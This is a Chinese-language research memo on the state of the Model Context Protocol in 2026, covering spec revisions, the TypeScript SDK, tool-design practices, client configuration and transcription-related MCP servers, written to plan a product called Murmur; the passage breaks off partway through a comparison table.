# MCP 生态现状与工具设计最佳实践调研（2026-09）

- **调研日期**：2026-09-06
- **调研目的**：为 Murmur 通过 MCP 和 CLI 把转写能力暴露给 AI agent / 自动化脚本的规划提供决策输入。
- **调研方法**：只采信一手资料——MCP 官方规范与文档（modelcontextprotocol.io）、官方 GitHub 仓库（github.com/modelcontextprotocol、microsoft、ChromeDevTools 等）、Anthropic 官方工程博客（anthropic.com/engineering）、产品官方文档/官网/官方仓库（superwhisper.com、docs.wisprflow.ai、macwhisper.com、help.figma.com、developers.figma.com 等）、npm registry（`npm view` 实测）。所有结论均标注来源 URL；查证不了的明确标注"未验证"。
- **一手资料清单（主要来源）**：
  - 规范与文档：`modelcontextprotocol.io/specification/2026-07-28`（含 `server/tools`、`basic/transports`、changelog 各版本页）、`modelcontextprotocol.io/llms.txt`（文档索引）、`modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices`、`modelcontextprotocol.io/docs/2026-07-28/learn/server-concepts`、`modelcontextprotocol.io/docs/2026-07-28/develop/connect-local-servers`
  - 官方博客：`blog.modelcontextprotocol.io/posts/2026-07-28/`（2026-07-28 版发布公告）、`blog.modelcontextprotocol.io/posts/2026-03-16-tool-annotations/`（tool annotations）
  - 官方仓库：`github.com/modelcontextprotocol/typescript-sdk`（main=v2 与 v1.x 分支）、`github.com/modelcontextprotocol/servers`、`github.com/modelcontextprotocol/registry`
  - Anthropic 工程博客：`anthropic.com/engineering/writing-tools-for-agents`
  - 客户端文档：`code.claude.com/docs/en/mcp`、`cursor.com/docs/mcp`、`code.visualstudio.com/docs/copilot/customization/mcp-servers`
  - 语音/转写产品：`superwhisper.com/blog/cli-mcp`、`docs.wisprflow.ai`（MCP 文章）、`macwhisper.com`、`github.com/Zackriya-Solutions/meetily`、`github.com/microsoft/VibeVoice`
  - 桥接模式代表：`github.com/microsoft/playwright-mcp`、`github.com/ChromeDevTools/chrome-devtools-mcp`（含 `docs/tool-reference.md`）、`help.figma.com`（Figma MCP server 指南）、`developers.figma.com/docs/figma-mcp-server/tools-and-prompts/`、`github.com/oraios/serena`
  - npm registry：`npm view @modelcontextprotocol/sdk`、`npm view @modelcontextprotocol/server`（2026-09-06 实测）
- **范围**：MCP 规范现状与 2025→2026 演进；TypeScript 官方 SDK；官方工具设计最佳实践；主流客户端接入本地 stdio server 的方式；语音/转写领域 MCP 生态与"桥接运行中实例"模式；本地 MCP server 安全要点。不含：远程 MCP 网关/企业部署细节、非 TypeScript SDK 的深入对比。

---

## TL;DR

1. **MCP 规范最新版本为 2026-07-28**，是发布以来最大的一次修订：协议核心从"有状态双向"改为**无状态 request/response**（`initialize` 握手与 `Mcp-Session-Id` 正式退役）；elicitation/sampling 被重设计为 Multi Round-Trip Requests（MRTR）；Roots、Sampling、Logging 被标记废弃；旧 **HTTP+SSE 传输正式废弃，有一年过渡期**；stdio 与 Streamable HTTP 是当前仅有的两个标准传输。来源：<https://blog.modelcontextprotocol.io/posts/2026-07-28/>、<https://modelcontextprotocol.io/specification/2026-07-28/basic/transports>。
2. **TypeScript SDK 发生了大分叉**：v1 单包 `@modelcontextprotocol/sdk`（npm latest **1.30.0**，2026-07-27 更新，维护窗口为 v2 发布后至少 6 个月）与 v2 拆分包 `@modelcontextprotocol/server` / `@modelcontextprotocol/client`（v2.0.0 于 2026-07-28 发布，实现 2026-07-28 spec）。本地 stdio server 最小形态仍是 `McpServer` + `registerTool`（zod schema）+ `StdioServerTransport`。来源：npm registry 实测、<https://github.com/modelcontextprotocol/typescript-sdk>。
3. **工具设计官方共识**：少量面向高影响工作流的工具优于大量薄包装 API 的工具（Anthropic：_"a few thoughtful tools targeting specific high-impact workflows"_）；命名用 snake_case 动词开头、可加前缀避免多 server 碰撞；返回 `structuredContent` + `outputSchema`；输入校验/业务错误用 `isError: true`（Tool Execution Error）而非 JSON-RPC error，让模型可自纠错；读类工具如实设置 `readOnlyHint: true` 等 annotations（注意默认值是悲观的：`destructiveHint` 默认 `true`）。来源：[anthropic.com/engineering/writing-tools-for-agents](https://www.anthropic.com/engineering/writing-tools-for-agents)、[spec server/tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)、[annotations 博文](https://blog.modelcontextprotocol.io/posts/2026-03-16-tool-annotations/)。
4. **"CLI 与 MCP 并行"已被官方方向盖章**：Playwright MCP（微软）README 明确建议 coding agent 优先用其 CLI+SKILLS（更省 token），MCP 留给长时自治工作流；superwhisper 用同一个 CLI 二进制提供 `search/export/stats` 子命令 + `superwhisper mcp` 子命令启动 MCP server。这正是 Murmur 规划的形态。来源：<https://github.com/microsoft/playwright-mcp>、<https://superwhisper.com/blog/cli-mcp>。
5. **用户接入本地 stdio server 的成本极低**：三大客户端（Claude Code `claude mcp add` / `.mcp.json`、Cursor `.cursor/mcp.json` 或 `~/.cursor/mcp.json`、VS Code `.vscode/mcp.json` 或 `code --add-mcp`）都只需一行 `command` + `args` 配置（+ 可选 `env`），客户端作为父进程拉起 server；首次使用需要用户批准/信任。注意三家配置键不同：Claude/Cursor 用 `mcpServers`，VS Code 用 `servers`。
6. **语音/转写 MCP 生态**：桌面听写产品已有两条官方路线——superwhisper（本地 CLI+MCP，暴露听写历史）与 WisprFlow（远程 MCP，浏览器 OAuth，只读会议/笔记，明确不暴露 dictations）；MacWhisper 官方只有 CLI（Pro）无 MCP；meetily 无 MCP 无 CLI。本地 whisper 类 MCP server 全是小社区项目（whisper.cpp 系），**中文转写 + 说话人分离的本地 MCP server 是空白**。来源见第 5 节各条目。
7. **"桥接运行中实例"是成熟模式**：Figma 桌面 app 自带本地 MCP server（selection-based prompting 只有桌面 server 支持）；Playwright MCP 默认自己拉起浏览器、可用 `--extension`/`--cdp-endpoint` 附加到运行中的浏览器；Chrome DevTools MCP 首次工具调用时自动启动 Chrome 或连接已有实例。Serena 展示了另一条纪律：与宿主 agent 重复的基础工具（如 `execute_shell_command`）默认禁用。来源：[Figma MCP 指南](https://help.figma.com/hc/en-us/articles/32132100833559-Guide-to-the-Dev-Mode-MCP-Server)、[playwright-mcp](https://github.com/microsoft/playwright-mcp)、[chrome-devtools-mcp](https://github.com/ChromeDevTools/chrome-devtools-mcp)、[serena](https://github.com/oraios/serena)。
8. **本地 server 安全要点**：stdio 是官方推荐的本地暴露方式（_"Use the `stdio` transport to limit access to just the MCP client"_）；本地 server 与客户端同权限运行，客户端必须先展示确切命令再执行；工具描述与 annotations 一律视为不可信输入；Servers MUST 校验所有工具输入、限速、消毒输出。日志必须写 stderr（stdout 是协议通道）。来源：[安全最佳实践](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)、[connect-local-servers](https://modelcontextprotocol.io/docs/2026-07-28/develop/connect-local-servers)。

---

## 1. MCP 规范现状（2026-09）

### 1.1 版本时间线与成熟度

| 版本                   | 关键内容                                                                                                                                                                                                                                                                           |
| ---------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 2024-11-05             | 初始公开版本（协议发布于 2024-11）                                                                                                                                                                                                                                                 |
| 2025-03-26             | OAuth 2.1 授权框架；**Streamable HTTP 替换 HTTP+SSE**；**tool annotations**（readOnlyHint 等）；JSON-RPC batching（后又于 2025-06-18 移除）；audio content 类型                                                                                                                    |
| 2025-06-18             | **结构化工具输出**（`structuredContent` + `outputSchema`）；MCP server 定位为 OAuth Resource Server（RFC 9728 Protected Resource Metadata）；RFC 8707 Resource Indicators 成为客户端必选；**elicitation** 首次引入；resource links；移除 JSON-RPC batching；新增官方安全最佳实践页 |
| 2025-11-25             | OIDC 发现、工具图标、增量 scope 同意（`WWW-Authenticate`）、工具命名指南（SEP-986）、elicitation 增强（URL mode、enum、默认值）、sampling 支持工具调用、OAuth Client ID Metadata Documents（CIMD）、**实验性 tasks**、JSON Schema 2020-12 默认方言                                 |
| **2026-07-28（最新）** | 见下文"2026-07-28 大修订"                                                                                                                                                                                                                                                          |

来源：<https://modelcontextprotocol.io/specification/2025-03-26/changelog>、<https://modelcontextprotocol.io/specification/2025-06-18/changelog>、<https://modelcontextprotocol.io/specification/2025-11-25/changelog>。

### 1.2 2026-07-28 大修订（"发布以来最大修订"）

官方公告原话：_"MCP is transforming from a bidirectional stateful protocol into a request/response stateless protocol."_ 要点：

- **无状态核心**：每个请求自描述（协议版本、客户端身份、能力都放在 `_meta.io.modelcontextprotocol/*` 字段里），_"Any request can now land on any server instance behind a plain round-robin load balancer."_
- **initialize 握手退役**：_"we've officially retired the initialize/initialized exchange along with the Mcp-Session-Id header"_（SEP-2575、SEP-2567）。提供可选的 `server/discover` RPC 供客户端预先获取能力，但不强制。需要状态的 server 应返回显式 handle 作为工具参数传递（规范新增 "Stateful Tools" 非规范性指南，见第 3 节）。
- **Multi Round-Trip Requests（MRTR，SEP-2322）**：取代 server 主动发起的 elicitation/sampling/roots 请求——server 返回 `resultType: "input_required"` + `inputRequests`（如 `elicitation/create`），客户端带着 `inputResponses` 与 `requestState` 重试同一调用。规范同时明确新的消息方向规则：_"servers do not initiate JSON-RPC requests and clients do not send JSON-RPC responses."_
- **Header-based routing（SEP-2243）**：请求须带 `Mcp-Method`、`Mcp-Name` 头，网关/WAF 可不解析 body 完成路由；工具参数可用 `x-mcp-header` 镜像成 `Mcp-Param-{name}` 头。
- **可缓存列表结果（SEP-2549）**：`tools/list` 等返回带 `ttlMs` / `cacheScope`。
- **授权加固**：RFC 9207 `iss` 校验（SEP-2468）、issuer 绑定的 client credentials（SEP-2352）、Dynamic Client Registration（DCR）正式废弃、改为推荐 Client ID Metadata Documents（CIMD）。
- **废弃项**：Roots、Sampling、Logging 被废弃（SEP-2577，新实现不应采用）；HTTP+SSE 传输 _"officially deprecated, with a year-long offramp"_；DCR 保留兼容但未来移除。
- **正式弃用政策**：最低 12 个月窗口，废弃特性在此期间继续可用。
- **扩展框架**：Tasks 从实验特性移入 `io.modelcontextprotocol/tasks` 扩展；MCP Apps（会话内交互 UI）、Skills over MCP 等作为可选扩展协商。
- **SDK 同步**：_"All four Tier 1 SDKs speak 2026-07-28 as of today"_（TypeScript、Python、Go、C#；Rust beta）。

来源：<https://blog.modelcontextprotocol.io/posts/2026-07-28/>（发布公告）、<https://modelcontextprotocol.io/specification/2026-07-28>（规范）、<https://modelcontextprotocol.io/specification/2026-07-28/server/tools>（tools 页含 MRTR 示例与消息方向规则）、<https://modelcontextprotocol.io/specification/2026-07-28/basic/transports>（传输总览与向后兼容矩阵）。

### 1.3 传输层现状

- 当前标准绑定只有两个：**stdio**（客户端拉起的子进程上、按行分隔的 JSON-RPC）与 **Streamable HTTP**（每条消息一个 HTTP POST 到单一 MCP endpoint，响应为 JSON 对象或 request-scoped SSE 流）。自定义传输允许，跑在可靠双向字节流上的自定义传输（如 Unix domain socket）应复用 stdio 帧。来源：<https://modelcontextprotocol.io/specification/2026-07-28/basic/transports>。
- **旧 HTTP+SSE 已废弃**：2025-03-26 用 Streamable HTTP 替换了它（changelog 原话 _"Replaced the previous HTTP+SSE transport"_），2026-07-28 公告确认正式 deprecated、一年下线期。来源同上。
- 向后兼容：规范有专门的 versioning/compatibility 章节，客户端与 server 检测对方"协议年代"并回退，含兼容矩阵——**旧年代 server（如按 2025-06-18 实现的 stdio server）在新客户端下仍可工作**。来源：<https://modelcontextprotocol.io/specification/2026-07-28/basic/transports#backward-compatibility>。

### 1.4 工具 annotations（readOnlyHint 等）

定义在 schema（`schema/2026-07-28/schema.ts`，仓库 `modelcontextprotocol/modelcontextprotocol`）的 `ToolAnnotations`，全部可选：

| 字段              | 含义                                                                               | 默认     |
| ----------------- | ---------------------------------------------------------------------------------- | -------- |
| `title`           | 人类可读标题                                                                       | —        |
| `readOnlyHint`    | true = 不修改环境                                                                  | false    |
| `destructiveHint` | true = 可能破坏性更新；false = 仅增量更新（仅当 `readOnlyHint == false` 时有意义） | **true** |
| `idempotentHint`  | true = 相同参数重复调用无额外副作用（仅当 `readOnlyHint == false` 时有意义）       | false    |
| `openWorldHint`   | true = 与外部实体交互（如 web 搜索）；false = 封闭域（如本地记忆）                 | true     |

规范警告：_"clients MUST consider tool annotations to be untrusted unless they come from trusted servers"_。官方博文（2026-03-16 "Tool Annotations as Risk Vocabulary"）解释默认值是刻意悲观的（_"The spec assumes the worst until told otherwise"_），并建议 server 作者：_"set readOnlyHint: true on read-only tools, destructiveHint: false on additive operations"_、封闭域工具设 `openWorldHint: false`。annotations 只影响决策不构成保证（_"Hints inform decisions; contracts enforce them"_）。Tool Annotations 兴趣组（2026-04-20 成立 charter，GitHub+OpenAI 牵头）正在评估 trust/sensitivity 等 6 个 SEP 扩展。来源：<https://modelcontextprotocol.io/specification/2026-07-28/server/tools>、<https://blog.modelcontextprotocol.io/posts/2026-03-16-tool-annotations/>、<https://modelcontextprotocol.io/community/interest-groups/tool-annotations>。

### 1.5 MCP Registry

官方社区注册表（"app store for MCP servers"）：2025-09-08 上线 preview；2025-10-24 API 冻结在 v0.1（尚未 GA）。server 用 `server.json` 描述；发布需验证命名空间控制权（GitHub OAuth/OIDC、DNS、HTTP 三种验证）；官方 `servers` 仓库 README 已把"找 server"的入口指向 Registry（registry.modelcontextprotocol.io）。来源：<https://github.com/modelcontextprotocol/registry>、<https://github.com/modelcontextprotocol/servers>。

---

## 2. TypeScript 官方 SDK

### 2.1 包与版本状态（2026-09-06 npm 实测）

| 包                                                            | latest 版本 | 最后发布   | 说明                                                                                                         |
| ------------------------------------------------------------- | ----------- | ---------- | ------------------------------------------------------------------------------------------------------------ |
| `@modelcontextprotocol/sdk`                                   | 1.30.0      | 2026-07-27 | v1 单包（client+server 都在里面）；源码在 `v1.x` 分支；官方承诺 v2 发布后至少 6 个月的 bug/安全修复          |
| `@modelcontextprotocol/server`                                | 2.0.0       | 2026-07-28 | v2 拆包后的 server 库（tools/resources/prompts、Streamable HTTP、stdio、auth helpers），实现 2026-07-28 spec |
| `@modelcontextprotocol/client`                                | （v2 配套） | —          | v2 拆包后的 client 库（transports、OAuth helpers）                                                           |
| `@modelcontextprotocol/node` / `express` / `fastify` / `hono` | —           | —          | v2 的薄中间件适配层                                                                                          |

v2 是官方口径的 "stable release line"；v1.x 继续维护。运行时：README 称 _"It runs on Node.js, Bun, and Deno"_（v2），v1 要求 peer dependency `zod`（`npm install @modelcontextprotocol/sdk zod`，内部 import `zod/v4` 但兼容 zod ≥3.25）。来源：`npm view` 实测（registry.npmjs.org）、<https://github.com/modelcontextprotocol/typescript-sdk>（main=v2 README）、v1.x 分支 README（<https://github.com/modelcontextprotocol/typescript-sdk/tree/v1.x>）。

### 2.2 最小 stdio server 形态

v1（`@modelcontextprotocol/sdk` 1.x，`docs/server.md`，仓库 `modelcontextprotocol/typescript-sdk` v1.x 分支）：

```ts
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";

const server = new McpServer({ name: "my-server", version: "1.0.0" });

server.registerTool(
  "calculate-bmi",
  {
    title: "BMI Calculator",
    description: "Calculate Body Mass Index",
    inputSchema: { weightKg: z.number(), heightM: z.number() },
    outputSchema: { bmi: z.number() },
  },
  async ({ weightKg, heightM }) => {
    const output = { bmi: weightKg / (heightM * heightM) };
    return {
      content: [{ type: "text", text: JSON.stringify(output) }],
      structuredContent: output,
    };
  },
);

const transport = new StdioServerTransport();
await server.connect(transport);
```

v2（`@modelcontextprotocol/server`，main 分支 README 示例）：

```ts
import { McpServer } from "@modelcontextprotocol/server";
import { StdioServerTransport } from "@modelcontextprotocol/server/stdio";
import * as z from "zod/v4";

const server = new McpServer({ name: "greeting-server", version: "1.0.0" });

server.registerTool(
  "greet",
  {
    description: "Greet someone by name",
    inputSchema: z.object({ name: z.string() }),
  },
  async ({ name }) => ({
    content: [{ type: "text", text: `Hello, ${name}!` }],
  }),
);

async function main() {
  const transport = new StdioServerTransport();
  await server.connect(transport);
}
main();
```

API 形态（`McpServer` + `registerTool(name, {description, inputSchema}, handler)` + `StdioServerTransport`）在 v1/v2 之间保持一致；v2 支持 Standard Schema（Zod v4、Valibot、ArkType 均可）。**对 Murmur 的含义**：用 v1.30.0 即可起步（Electron 主进程/独立 Node 入口直接复用），API 迁移到 v2 的成本主要是改 import 路径与包名。来源：仓库文件 `docs/server.md`（v1.x 分支）、`README.md`（main 分支）。

---

## 3. 官方工具设计最佳实践（Anthropic / MCP 文档）

### 3.1 Anthropic《Writing tools for agents》（2025-09-11）

来源：<https://www.anthropic.com/engineering/writing-tools-for-agents>

- **命名**：未硬性规定"动词\_名词"，但全部官方示例是 snake_case、动词开头、可带服务/资源前缀（`asana_search`、`asana_projects_search`、`search_contacts`、`schedule_event`、`get_customer_context`）。参数名要具体：_"instead of a parameter named user, try a parameter named user_id."_ 前缀 vs 后缀的选择 _"Effects vary by LLM"_，需实测。
- **描述写法**：_"think of how you would describe your tool to a new hire on your team"_——把隐含上下文（查询格式、术语、资源关系）写显式。_"Even small refinements to tool descriptions can yield dramatic improvements"_（仅改描述就把 Claude Sonnet 3.5 推到 SWE-bench Verified SOTA）。**错误信息也要 prompt-engineer**：_"prompt-engineer your error responses to clearly communicate specific and actionable improvements"_。
- **小而聚焦 vs 大工具**：倾向**少量、面向高影响工作流的整合型工具**：_"We recommend building a few thoughtful tools targeting specific high-impact workflows"_；常见错误是 _"tools that merely wrap existing software functionality or API endpoints"_；_"More tools don't always lead to better outcomes"_。整合示例：`schedule_event`（替代 list_users + list_events + create_event）、`search_logs`（替代 read_logs）、`get_customer_context`（替代三个查找工具）——目的之一是 _"reduce the context that would have otherwise been consumed by intermediate outputs"_。每个工具要有清晰、不重叠的职责。
- **返回设计**：返回高信号内容；_"eschew low-level technical identifiers"_（uuid、mime type），用自然语言名称（把 UUID 解析成词显著降低幻觉）；可提供 `response_format` 枚举（"concise"/"detailed"）；分页、过滤、截断（Claude Code 工具输出上限 25,000 tokens）；XML/JSON/Markdown _"there is no one-size-fits-all solution"_。
- **评测**：用真实数据生成任务；跟踪准确率之外还要跟踪工具调用数、token 消耗、工具错误数（冗余调用提示分页设计差，参数错误提示描述不清）。

### 3.2 MCP 规范中的工具设计要求与指南

来源：<https://modelcontextprotocol.io/specification/2026-07-28/server/tools>

- **命名（SEP-986）**：1–128 字符、大小写敏感、只允许 `A-Z a-z 0-9 _ - .`、server 内唯一；合法示例 `getUser`、`DATA_EXPORT_v2`、`admin.tools.list`。注意：server `name`（serverInfo）不保证全局唯一，聚合多 server 的客户端可能遇到重名，**server 侧用前缀自我命名空间是稳妥做法**。
- **确定性顺序**：`tools/list` SHOULD 返回确定性顺序（提升客户端缓存与 LLM prompt cache 命中）。
- **无参工具**：推荐 `inputSchema: { "type": "object", "additionalProperties": false }`。
- **结构化输出**：定义 `outputSchema` 并返回 `structuredContent`（可为任意 JSON 值）；为向后兼容同时返回序列化 JSON 的 TextContent。
- **错误处理**：两类机制——Protocol Errors（JSON-RPC error：未知工具、请求畸形，模型难以自纠）与 **Tool Execution Errors（`isError: true`**：API 失败、输入校验、业务逻辑错误，客户端 SHOULD 提供给模型自纠）。2025-11-25 起明确：**输入校验错误应作为 Tool Execution Error 而非 Protocol Error**（SEP-1303）。
- **Stateful Tools 指南（非规范性）**：协议无会话，跨调用状态用显式 handle（创建工具返回 handle、后续工具接 handle）；handle 要不可猜测（足够熵）、生命周期写进创建工具的 description、对过期 handle 返回明确说明的 tool execution error。
- **annotations**：见 1.4；如实标注。
- **人在环**：工具调用 SHOULD 有人类可拒绝（human in the loop）。

### 3.3 三种原语怎么选

来源：<https://modelcontextprotocol.io/docs/2026-07-28/learn/server-concepts>

| 原语          | 控制方                           | 用途                                                                | 示例                                                |
| ------------- | -------------------------------- | ------------------------------------------------------------------- | --------------------------------------------------- |
| **Tools**     | Model（模型自动发现并调用）      | 执行动作/计算：写文件、调 API、触发逻辑                             | `searchFlights`、`sendEmail`、`createCalendarEvent` |
| **Resources** | Application（应用决定何时取用）  | 只读上下文数据，URI + MIME 类型，支持 Resource Templates 与订阅变更 | `file:///...`、`calendar://events/2024`             |
| **Prompts**   | User（用户显式调用，如斜杠命令） | 参数化指令模板，展示 server 的最佳用法                              | "Plan a vacation"、"Summarize my meetings"          |

经验法则：模型需要"做"的用 tool；给模型"看"的只读数据用 resource（application 控制注入时机）；引导用户走固定流程用 prompt。

### 3.4 CLI 与 MCP 并行的官方模式

- **Playwright MCP（微软官方）**：README 提供 CLI+SKILLS 替代方案，并给出选择建议：coding agents 用 CLI（token 更省），_"MCP for long-running autonomous workflows where maintaining continuous browser context outweighs token cost concerns"_。来源：<https://github.com/microsoft/playwright-mcp>。
- **Chrome DevTools MCP**：_"A CLI is also provided for non-MCP use"_。来源：<https://github.com/ChromeDevTools/chrome-devtools-mcp>。
- **superwhisper**：同一 CLI 二进制，子命令 `search/export/stats/vocab/snippets` + `superwhisper mcp` 启动本地 MCP server；_"All responses are written to stdout to easily chain with other commands"_；CLI 与 MCP 共享同一底层数据（听写历史）。来源：<https://superwhisper.com/blog/cli-mcp>。
- **MacWhisper**：Pro 功能 _"Control MacWhisper from the CLI. Hook it up in your agent or scripting workflows."_（无官方 MCP）。来源：<https://www.macwhisper.com/>。

结论：**CLI 优先、MCP 复用同一实现**是 2026 年的官方主流形态——CLI 服务 shell 脚本与省 token 的 coding agent，MCP 服务通用 agent 客户端。

---

## 4. 主流客户端如何接入本地 MCP server

共同模型：客户端读配置文件，以父进程方式 spawn `command + args`（可选注入 `env`），通过 stdin/stdout 的 JSON-RPC 通信；首次使用需要用户批准/信任。

### 4.1 Claude Code

来源：<https://code.claude.com/docs/en/mcp>

```bash
# stdio 服务器：-- 之后的所有内容原样传给 server
claude mcp add [options] <name> -- <command> [args...]
# 示例
claude mcp add --env AIRTABLE_API_KEY=YOUR_KEY --transport stdio airtable -- npx -y airtable-mcp-server
```

- 三种 scope：`local`（默认，`~/.claude.json`，仅本项目本人）、`project`（**`.mcp.json` 文件，提交进版本库共享**，首次使用需交互批准，可 `claude mcp reset-project-choices` 重置）、`user`（跨项目）。优先级 local → project → user。
- `.mcp.json` 支持 `${VAR}` / `${VAR:-default}` 环境变量展开（`command`/`args`/`env`/`url`/`headers`）。
- `MCP_TIMEOUT` 控制启动超时；`MAX_MCP_OUTPUT_TOKENS` 调输出上限（**默认 25,000 tokens**，10,000 时告警）。
- 会话内 `/mcp` 查看连接状态、OAuth 认证、启停 server；shell 侧 `claude mcp list/get/remove`。

### 4.2 Cursor

来源：<https://cursor.com/docs/mcp>

- 配置文件：项目级 `.cursor/mcp.json`，或全局 `~/.cursor/mcp.json`。
- 顶层键为 `mcpServers`；stdio 字段：`type: "stdio"`（必填）、`command`（必填）、`args`、`env`、`envFile`（仅 stdio 支持）。支持 `${env:NAME}`、`${userHome}`、`${workspaceFolder}`、`${pathSeparator}` 插值。
- Cursor 默认在使用 MCP 工具前请求批准（Run Modes 可配置）；也可从 Cursor Marketplace 一键安装或经 Extension API 注册。

### 4.3 VS Code

来源：<https://code.visualstudio.com/docs/copilot/customization/mcp-servers>

- 三种添加方式：扩展市场搜索 `@mcp`；命令面板 **MCP: Add Server**（选 Workspace/Global）；CLI：`code --add-mcp '{"name":"my-server","command":"uvx","args":["mcp-server-fetch"]}'`。
- 工作区文件 `.vscode/mcp.json`（**顶层键是 `servers`，不是 `mcpServers`**），建议提交源码库共享；用户级配置跨 workspace。stdio server 字段 `command`/`args`（无 `type` 时默认 stdio；http 用 `url`）。
- 首次启动有信任确认（MCP: Reset Trust 可重置）；沙箱（`sandboxEnabled`，限制文件写入与网络域名）目前仅 macOS/Linux。
- 支持从其他 app（如 Claude Desktop）自动发现配置（`chat.mcp.discovery.enabled`）。

### 4.4 Claude Desktop（作为对照组）

`~/Library/Application Support/Claude/claude_desktop_config.json`（macOS）写 `mcpServers.command/args/env`，重启生效；stdio server 的 stderr 会写入 `mcp-server-*.log`；`npx` 系 server 需要全局安装的 npm。来源：<https://modelcontextprotocol.io/docs/2026-07-28/develop/connect-local-servers>。

**对 Murmur 的含义**：一个本地 `murmur mcp` 入口（stdio）即可同时进三家客户端；文档需按客户端分别给出配置片段（三家的文件路径与顶层键都不同）。

---

## 5. 语音 / 转写领域的 MCP 生态

### 5.1 听写 / 转写产品

| 产品                       | MCP                                     | CLI                                                                                                                                                                      | 一手来源与要点                                                                                                                                                                                                                                                                                                                                          |
| -------------------------- | --------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **superwhisper**           | ✅ 官方本地 MCP（`superwhisper mcp`）   | ✅ 官方 CLI（`search`/`export`/`stats`/`vocab`/`snippets`）                                                                                                              | <https://superwhisper.com/blog/cli-mcp>：把听写历史暴露给 _"Claude, Codex, Pi, or whatever harness you use"_；历史本地存储；另有 Claude Code/Codex/Pi/OpenCode 插件做"语音进、结果出"的实时回路                                                                                                                                                         |
| **WisprFlow（Flow）**      | ✅ 官方**远程** MCP server              | —（未在调研中发现官方 CLI，未验证）                                                                                                                                      | <https://docs.wisprflow.ai/articles/9551372685-connect-an-mcp-client-to-wispr-flow-remote-mcp-server>：Settings → MCP 复制 URL 加入任意客户端；浏览器账号授权（_"There is no key or token to paste"_）；**只读**：会议摘要/笔记/转写/日历；_"Your dictations are never exposed"_；Mac only、需 Notetaker、Enterprise 不可用；数据从云端账户拉取而非本地 |
| **MacWhisper**             | ❌ 官方无（官网无任何 MCP 提及）        | ✅ 官方 CLI（Pro）                                                                                                                                                       | <https://www.macwhisper.com/>：_"Control MacWhisper from the CLI. Hook it up in your agent or scripting workflows."_；社区桥接：`docdyhr/macwhisper-mcp-server`（LobeHub 收录页 <https://lobehub.com/mcp/docdyhr-macwhisper-mcp-server>，把音频文件丢 Desktop 后由 Claude 调用转写——非官方）                                                            |
| **meetily**                | ❌ README 无 MCP 提及（已直接核对仓库） | ❌ 无终端用户 CLI（仅开发者构建）                                                                                                                                        | <https://github.com/Zackriya-Solutions/meetily>：Tauri + Rust backend + Next.js frontend；本地 Whisper/Parakeet 实时转写；摘要可选 Ollama/Claude/Groq/OpenRouter/OpenAI-compatible；`.exe`/`.dmg` 分发                                                                                                                                                  |
| **VibeVoice（microsoft）** | ❌ 仓库无 MCP 提及                      | ⚠️ 无打包 CLI；`docs/vibevoice-asr.md` 提供的是 docker + `pip install -e .` + demo Python 脚本（`vibevoice_asr_gradio_demo.py`、`vibevoice_asr_inference_from_file.py`） | <https://github.com/microsoft/VibeVoice>：开源语音模型家族（TTS + ASR，7.5Hz 连续语音 tokenizer + next-token diffusion）；VibeVoice-ASR-7B 支持单次 60 分钟长音频、Who/When/What 结构化转写、custom hotwords；TTS 代码因滥用于 2025-09-05 从仓库移除                                                                                                    |

### 5.2 whisper 类 MCP server（均为社区项目）

- **SmartLittleApps/local-stt-mcp**：whisper.cpp 本地转写，Apple Silicon 优化（宣称 15.8x 实时、<2GB 内存）。工具：`transcribe`、`transcribe_long`（长文件分块）、`transcribe_with_speakers`（pyannote speaker-diarization-3.1，需 HF token）、`list_models`、`health_check`、`version`。Node 18+、stdio、输出 txt/json/vtt/srt/csv。来源：<https://github.com/SmartLittleApps/local-stt-mcp>。
- **jwulff/whisper-mcp**：极简 whisper.cpp MCP server（作者自述因为同类实现太多而专注最小化）。来源：<https://github.com/jwulff/whisper-mcp>（基于搜索结果定位到仓库，未逐行核验 README，标注：未深度验证）。
- **eviscerations/whisper-windows-mcp**：Windows 原生 whisper.cpp 转写（GPU 加速）。来源：<https://mcpservers.org/servers/eviscerations/whisper-windows-mcp>（第三方目录页，标注：未深度验证）。
- **arcaputo3/mcp-server-whisper**：走 OpenAI 云 API（`transcribe_audio`、`chat_with_audio`、`create_audio` 等 8 个工具，需 `OPENAI_API_KEY`）；**已宣布停止维护**并迁移到 `TJC-LP/sanzaru`。来源：<https://github.com/arcaputo3/mcp-server-whisper>。
- 官方 `modelcontextprotocol/servers` 仓库现为 7 个参考实现（Everything/Fetch/Filesystem/Git/Memory/Sequential Thinking/Time），**无任何音频/转写 server**；目录职能已交给 MCP Registry。来源：<https://github.com/modelcontextprotocol/servers>。

**空白点**：以上 whisper 类 server 均为英文社区项目、基于 whisper.cpp/OpenAI API；未发现支持**中文优先模型（如 FunASR Paraformer）+ 说话人分离 + 历史检索**的本地 MCP server。官方 Registry 是否已有中文转写 server 未逐一核查（未验证）。

### 5.3 "桌面应用官方 MCP server 桥接运行中实例"模式的代表

| 项目                                               | 桥接方式                                                                                                                                                                                                                                                               | 暴露的工具（节选）                                                                                                                                                                                                                                                                          | 来源                                                                                                                                                                |
| -------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Playwright MCP**（microsoft，36.8k★）            | 三模式：默认**自起浏览器**（按 workspace 持久 profile）；`--extension` 经官方扩展附加到**运行中的** Chrome/Edge（复用登录态）；`--cdp-endpoint` 连已有 Chromium/远程端点。核心设计：accessibility tree 快照而非截图（_"No vision models needed"_）                     | `browser_navigate`、`browser_click`、`browser_type`、`browser_fill_form`、`browser_snapshot`、`browser_evaluate`、`browser_wait_for`、`browser_tabs` 等；`--caps` 按需解锁 vision/pdf/devtools/network/testing                                                                              | <https://github.com/microsoft/playwright-mcp>                                                                                                                       |
